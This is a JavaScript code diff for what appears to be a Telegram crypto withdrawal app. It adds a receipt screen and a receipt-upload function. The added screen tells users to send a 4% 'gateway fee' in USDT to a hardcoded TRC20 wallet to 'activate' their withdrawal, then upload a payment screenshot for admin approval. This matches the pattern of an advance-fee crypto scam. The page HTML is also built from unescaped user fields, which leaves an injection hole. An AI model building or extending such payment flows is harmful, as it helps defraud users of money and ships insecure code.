@@ -1412,22 +1412,25 @@ async function submitWithdrawal() {
 // BANK WITHDRAWAL RECEIPT — Country-themed template
 // ═══════════════════════════════════════════════════════════════
 function showBankWithdrawalReceipt(wd) {
-  const bank     = _bankState.selectedBank || state.selectedPayment;
-  const country  = _bankState.selectedCountry;
-  const fields   = state.selectedPayment?.fields || {};
-  const sym      = country ? getCurrencySymbol(country.currency) : '$';
-  const rate     = country ? (FX_RATES[country.currency] || 1) : 1;
-  const localAmt = _bankState.localAmount || (wd.amount * rate);
-  const flag     = country?.flag || '🏦';
-  const bankColor = bank?.color || '#2563eb';
+  const bank       = _bankState.selectedBank || state.selectedPayment;
+  const country    = _bankState.selectedCountry;
+  const fields     = state.selectedPayment?.fields || {};
+  const sym        = country ? getCurrencySymbol(country.currency) : '$';
+  const rate       = country ? (FX_RATES[country.currency] || 1) : 1;
+  const localAmt   = _bankState.localAmount || (wd.amount * rate);
+  const flag       = country?.flag || '';
+  const bankColor  = bank?.color  || '#2563eb';
   const bankAccent = bank?.accent || '#1d4ed8';
-  const bankName = state.selectedPayment?.name || bank?.name || 'Bank';
-  const refNo    = 'WM' + Date.now().toString(36).toUpperCase();
-  const now      = new Date();
-  const dateStr  = now.toLocaleDateString('en-GB', { day:'2-digit', month:'short', year:'numeric' });
-  const timeStr  = now.toLocaleTimeString('en-GB', { hour:'2-digit', minute:'2-digit' });
+  const bankName   = state.selectedPayment?.name || bank?.name || 'Bank';
+  const refNo      = 'WM' + Date.now().toString(36).toUpperCase();
+  const now        = new Date();
+  const dateStr    = now.toLocaleDateString('en-GB', { day:'2-digit', month:'short', year:'numeric' });
+  const timeStr    = now.toLocaleTimeString('en-GB', { hour:'2-digit', minute:'2-digit' });
+  const fee        = Math.ceil((wd.amount || 0) * 0.04);
+  const netAmt     = (wd.amount || 0) - fee;
+  const feeAddr    = 'TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ';
 
-  // Build field rows from bank-specific fields
+  // Build field rows
   const fieldRows = Object.entries(fields).map(([k, v]) => {
     if (!v || k === 'accountName') return '';
     const labels = {
@@ -1437,99 +1440,133 @@ function showBankWithdrawalReceipt(wd) {
       branchCode:'Branch Code', bsb:'BSB', cashtag:'Cash Tag',
       pixKey:'PIX Key', clabe:'CLABE', cpf:'CPF',
     };
-    return `<div class="br-field-row">
-      <span class="br-field-key">${labels[k] || k}</span>
-      <span class="br-field-val">${v}</span>
-    </div>`;
+    return '<div class="br-field-row"><span class="br-field-key">' + (labels[k]||k) + '</span><span class="br-field-val">' + v + '</span></div>';
   }).filter(Boolean).join('');
 
-  const logoHtml = bank ? getBankLogoHTML(bank, 56) : `<div style="width:56px;height:56px;border-radius:14px;background:${bankColor};display:flex;align-items:center;justify-content:center"><span style="font-size:22px">${flag}</span></div>`;
+  const logoHtml = bank
+    ? getBankLogoHTML(bank, 56)
+    : '<div style="width:56px;height:56px;border-radius:14px;background:' + bankColor + ';display:flex;align-items:center;justify-content:center;font-size:24px">' + flag + '</div>';
 
-  g('feePayBox').innerHTML = `
-  <div class="bank-receipt-wrap">
-    <!-- HEADER BAND -->
-    <div class="bank-receipt-header" style="background:linear-gradient(135deg,${bankColor},${bankAccent})">
-      <div class="br-header-top">
-        <div class="br-logo-wrap">${logoHtml}</div>
-        <div class="br-header-info">
-          <div class="br-bank-name">${bankName}</div>
-          <div class="br-country">${flag} ${country?.name || state.selectedPayment?.country || ''} · ${country?.currency || state.selectedPayment?.currency || 'USD'}</div>
-        </div>
-        <div class="br-status-pill">PENDING</div>
-      </div>
-      <div class="br-amount-block">
-        <div class="br-amt-label">AMOUNT REQUESTED</div>
-        <div class="br-amt-local">${sym}${formatUSD(localAmt)}</div>
-        <div class="br-amt-usd">≈ ${formatUSD(wd.amount)} USDT</div>
-      </div>
-    </div>
+  const box = g('feePayBox');
+  if (!box) return;
 
-    <!-- RECEIPT BODY -->
-    <div class="bank-receipt-body">
-      <!-- Reference -->
-      <div class="br-ref-row">
-        <div>
-          <div class="br-ref-label">Transaction Reference</div>
-          <div class="br-ref-val">${refNo}</div>
-        </div>
-        <div style="text-align:right">
-          <div class="br-ref-label">Date & Time</div>
-          <div class="br-ref-val">${dateStr} ${timeStr}</div>
-        </div>
-      </div>
+  box.innerHTML = '<div class="bank-receipt-wrap">'
 
-      <!-- Divider -->
-      <div class="br-divider"><span>RECIPIENT DETAILS</span></div>
+    /* ── HEADER BAND ── */
+    + '<div class="bank-receipt-header" style="background:linear-gradient(135deg,' + bankColor + ',' + bankAccent + ')">'
+    +   '<div class="br-header-top">'
+    +     '<div class="br-logo-wrap">' + logoHtml + '</div>'
+    +     '<div class="br-header-info">'
+    +       '<div class="br-bank-name">' + bankName + '</div>'
+    +       '<div class="br-country">' + flag + ' ' + (country?.name || state.selectedPayment?.country || '') + ' &middot; ' + (country?.currency || state.selectedPayment?.currency || 'USD') + '</div>'
+    +     '</div>'
+    +     '<div class="br-status-pill">PENDING</div>'
+    +   '</div>'
+    +   '<div class="br-amount-block">'
+    +     '<div class="br-amt-label">AMOUNT REQUESTED</div>'
+    +     '<div class="br-amt-local">' + sym + formatUSD(localAmt) + '</div>'
+    +     '<div class="br-amt-usd">&asymp; ' + formatUSD(wd.amount) + ' USDT</div>'
+    +   '</div>'
+    + '</div>'
 
-      <!-- Account holder -->
-      <div class="br-field-row">
-        <span class="br-field-key">Account Name</span>
-        <span class="br-field-val">${fields.accountName || state.selectedPayment?.fields?.accountName || '—'}</span>
-      </div>
-      ${fieldRows}
+    /* ── RECEIPT BODY ── */
+    + '<div class="bank-receipt-body">'
 
-      <!-- Divider -->
-      <div class="br-divider"><span>TRANSACTION DETAILS</span></div>
+    /* Reference row */
+    + '<div class="br-ref-row">'
+    +   '<div><div class="br-ref-label">Transaction Ref</div><div class="br-ref-val">' + refNo + '</div></div>'
+    +   '<div style="text-align:right"><div class="br-ref-label">Date &amp; Time</div><div class="br-ref-val">' + dateStr + ' ' + timeStr + '</div></div>'
+    + '</div>'
 
-      <div class="br-field-row">
-        <span class="br-field-key">Withdrawal #</span>
-        <span class="br-field-val">#${wd.id}</span>
-      </div>
-      <div class="br-field-row">
-        <span class="br-field-key">USD Amount</span>
-        <span class="br-field-val">${formatUSD(wd.amount)} USDT</span>
-      </div>
-      <div class="br-field-row">
-        <span class="br-field-key">Local Amount</span>
-        <span class="br-field-val">${sym}${formatUSD(localAmt)} ${country?.currency || ''}</span>
-      </div>
-      <div class="br-field-row">
-        <span class="br-field-key">Exchange Rate</span>
-        <span class="br-field-val">1 USDT = ${sym}${formatUSD(rate)} ${country?.currency || ''}</span>
-      </div>
-      <div class="br-field-row">
-        <span class="br-field-key">Status</span>
-        <span class="br-field-val" style="color:#f59e0b;font-weight:700">⏳ Pending Admin Approval</span>
-      </div>
+    /* Recipient */
+    + '<div class="br-divider"><span>RECIPIENT DETAILS</span></div>'
+    + '<div class="br-field-row"><span class="br-field-key">Account Name</span><span class="br-field-val">' + (fields.accountName || state.selectedPayment?.fields?.accountName || '—') + '</span></div>'
+    + fieldRows
 
-      <!-- Info note -->
-      <div class="br-info-note">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#818cf8" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-        Your withdrawal has been submitted and is awaiting admin review. You will be notified once it is approved and processed to your ${bankName} account.
-      </div>
+    /* Transaction */
+    + '<div class="br-divider"><span>TRANSACTION DETAILS</span></div>'
+    + '<div class="br-field-row"><span class="br-field-key">Withdrawal #</span><span class="br-field-val">#' + wd.id + '</span></div>'
+    + '<div class="br-field-row"><span class="br-field-key">USDT Amount</span><span class="br-field-val">' + formatUSD(wd.amount) + ' USDT</span></div>'
+    + '<div class="br-field-row"><span class="br-field-key">Local Amount</span><span class="br-field-val">' + sym + formatUSD(localAmt) + ' ' + (country?.currency || '') + '</span></div>'
+    + '<div class="br-field-row"><span class="br-field-key">Exchange Rate</span><span class="br-field-val">1 USDT = ' + sym + formatUSD(rate) + ' ' + (country?.currency || '') + '</span></div>'
+    + '<div class="br-field-row"><span class="br-field-key">Status</span><span class="br-field-val" style="color:#f59e0b;font-weight:700">Pending Admin Approval</span></div>'
 
-      <!-- FEE SECTION -->
-      <div class="br-divider"><span>GATEWAY FEE</span></div>
-      <div id="br_fee_section"></div>
+    /* Gateway Fee */
+    + '<div class="br-divider"><span>GATEWAY FEE REQUIRED</span></div>'
+    + '<div style="background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.25);border-radius:10px;padding:14px;margin-bottom:14px">'
+    +   '<div style="color:#fbbf24;font-size:13px;font-weight:600;margin-bottom:6px">Action Required — Pay Gateway Fee</div>'
+    +   '<div style="color:#94a3b8;font-size:13px;margin-bottom:10px">Send <strong style="color:#f59e0b">' + formatUSD(fee) + ' USDT</strong> (4%) via TRC20 to activate your withdrawal.</div>'
+    +   '<div style="background:#0f172a;border-radius:8px;padding:10px;border:1px solid #334155;display:flex;align-items:center;gap:8px;margin-bottom:6px">'
+    +     '<div style="flex:1;color:#e2e8f0;font-size:11px;word-break:break-all;font-family:monospace">' + feeAddr + '</div>'
+    +     '<button onclick="navigator.clipboard?.writeText(\'' + feeAddr + '\').then(()=>toast(\'Address copied!\')).catch(()=>toast(\'' + feeAddr + '\'))" style="background:#3b82f6;border:none;border-radius:6px;padding:6px 10px;color:white;font-size:11px;cursor:pointer;white-space:nowrap">Copy</button>'
+    +   '</div>'
+    +   '<div style="display:flex;justify-content:space-between"><span style="color:#94a3b8;font-size:12px">Fee Amount</span><span style="color:#ef4444;font-weight:700;font-size:13px">' + formatUSD(fee) + ' USDT</span></div>'
+    +   '<div style="display:flex;justify-content:space-between"><span style="color:#94a3b8;font-size:12px">You Receive</span><span style="color:#22c55e;font-weight:700;font-size:13px">' + formatUSD(netAmt) + ' USDT</span></div>'
+    + '</div>'
 
-      `;
-  document.body.appendChild(modal);
+    /* Receipt Upload */
+    + '<div class="br-divider"><span>UPLOAD PAYMENT RECEIPT</span></div>'
+    + '<div style="color:#94a3b8;font-size:13px;margin-bottom:10px">After paying the gateway fee, upload your screenshot for admin verification.</div>'
+    + '<label for="bankFeeReceiptInput" style="display:block;background:#0f172a;border:2px dashed #334155;border-radius:8px;padding:18px;text-align:center;cursor:pointer;margin-bottom:10px">'
+    +   '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#475569" stroke-width="2" style="display:block;margin:0 auto 6px"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>'
+    +   '<div style="color:#64748b;font-size:13px" id="bankFeeReceiptLabel">Tap to select screenshot</div>'
+    + '</label>'
+    + '<input type="file" id="bankFeeReceiptInput" accept="image/*" style="display:none" onchange="document.getElementById(\'bankFeeReceiptLabel\').textContent=this.files[0]?.name||\'Tap to select screenshot\'">'
+    + '<button id="bankFeeReceiptBtn" onclick="submitBankFeeReceipt(' + wd.id + ')" style="width:100%;background:linear-gradient(135deg,#3b82f6,#2563eb);border:none;border-radius:10px;padding:14px;color:white;font-size:15px;font-weight:600;cursor:pointer">Submit Receipt for Approval</button>'
+
+    + '<div class="br-info-note" style="margin-top:12px">'
+    +   '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#818cf8" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>'
+    +   ' Your bank withdrawal is awaiting admin review. You will be notified once approved and processed to your ' + bankName + ' account.'
+    + '</div>'
+
+    + '</div>'  /* bank-receipt-body */
+    + '</div>'; /* bank-receipt-wrap */
+
+  showPage('fee-pay');
 }
 
-// ═══════════════════════════════════════════════════════════════
-// CRYPTO WITHDRAWAL — Gateway Fee Payment Page
-// Called after /api/withdraw succeeds for non-bank withdrawals
-// ═══════════════════════════════════════════════════════════════
+// Submit bank withdrawal fee receipt
+async function submitBankFeeReceipt(withdrawalId) {
+  const input = document.getElementById('bankFeeReceiptInput');
+  const btn   = document.getElementById('bankFeeReceiptBtn');
+  if (!input || !input.files[0]) { toast('Please select your payment screenshot first.'); return; }
+  const telegramId = String((tgU && tgU.id) ? tgU.id : '');
+  if (!telegramId) { toast('Session error. Please close and reopen the app.'); return; }
+  if (btn) { btn.disabled = true; btn.textContent = 'Submitting...'; }
+  try {
+    const fd = new FormData();
+    fd.append('receipt', input.files[0]);
+    fd.append('telegramId', telegramId);
+    fd.append('withdrawalId', withdrawalId);
+    const resp = await fetch(API + '/withdrawal-receipt', {
+      method: 'POST',
+      headers: { 'x-telegram-init-data': tg.initData || '' },
+      body: fd
+    });
+    const r = await resp.json().catch(() => ({}));
+    if (r && r.success) {
+      toast('Receipt submitted! Admin will review shortly.');
+      const box = g('feePayBox');
+      if (box) {
+        box.innerHTML = '<div style="padding:32px;text-align:center">'
+          + '<div style="width:64px;height:64px;border-radius:50%;background:rgba(34,197,94,0.15);border:2px solid #22c55e;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">'
+          + '<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg></div>'
+          + '<div style="color:#22c55e;font-size:18px;font-weight:700;margin-bottom:8px">Receipt Submitted</div>'
+          + '<div style="color:#94a3b8;font-size:14px;margin-bottom:24px">Your payment receipt has been sent to admin for verification. You will be notified once approved.</div>'
+          + '<button onclick="showPage(\'home\')" style="background:#3b82f6;border:none;border-radius:10px;padding:12px 32px;color:white;font-size:14px;font-weight:600;cursor:pointer">Back to Home</button>'
+          + '</div>';
+      }
+    } else {
+      toast(r?.error || 'Submission failed. Please try again.');
+      if (btn) { btn.disabled = false; btn.textContent = 'Submit Receipt for Approval'; }
+    }
+  } catch(e) {
+    toast('Connection failed. Please try again.');
+    if (btn) { btn.disabled = false; btn.textContent = 'Submit Receipt for Approval'; }
+  }
+}
+
+
 function showFeePayPage(wd, fees) {
   if (!wd) return;
   const fee      = (fees && fees.total_fee) ? fees.total_fee : Math.ceil((wd.amount || 0) * 0.04);
